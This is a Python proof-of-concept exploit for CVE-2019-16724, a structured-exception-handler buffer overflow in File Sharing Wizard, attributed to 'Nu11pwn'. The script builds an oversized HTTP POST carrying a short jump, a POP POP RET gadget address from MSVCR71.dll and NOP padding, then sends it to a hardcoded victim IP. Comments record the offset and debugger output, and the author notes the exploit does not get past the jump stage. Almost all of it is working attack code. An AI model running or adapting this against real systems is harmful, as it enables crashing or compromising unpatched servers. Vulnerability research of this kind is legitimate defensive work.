import socket
from struct import *

# File-sharing-wizard-seh

#-----------------------------------------------------------------#
#	Bad characters: \x00					  #
#	SEH value:  0x909032EB  (JMP short)			  #
#	NSEH value: 0x909032EB	(POP POP RET)			  #
#-----------------------------------------------------------------#

#  Assigned CVE ID : CVE-2019-16724


#  cant get passed POP POP RET and short jump

victim_host = "10.0.0.213"
victim_port = 80


nseh = pack ('<I',0x909032EB) # Short jump 
seh = pack('I',0x7c38a67f)	# POP POP RET

exploit_payload  = "A" * 1040
exploit_payload += nseh
exploit_payload += seh
exploit_payload += "\x90" * 100
exploit_payload += "D" *(5000 - len(exploit_payload))

payload_header  = "POST " + exploit_payload
payload_header +=" HTTP/1.0\r\n\r\n"

# overflowed SEH handler - 42386942 : [*] Exact match at offset 1044

# POP POP RET - 7C37BBB5
# Log data, item 24
# Address=7C37BBB5
# Message=  0x7c37bbb5 : pop ecx # pop ecx # ret 0x08 |  {PAGE_EXECUTE_READ} [MSVCR71.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v7.10.6030.0 (C:\Program Files\File Sharing Wizard\bin\MSVCR71.dll)

try:
	print("""
	--------------------------------
	CVE-2019-16724 proof of concept
	Author: Nu11pwn
	File sharing wizard SEH overflow
	--------------------------------
	""")
	expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print("[x] Setting up a socket connection")
	expl.connect((victim_host, victim_port))
	print("[x] Establishing a connection to the victim")
	expl.send(payload_header)
	print("[x] Sending ")
except:
	print("[!] Error establishing a connection")
	print("[!] Error sending exploit")
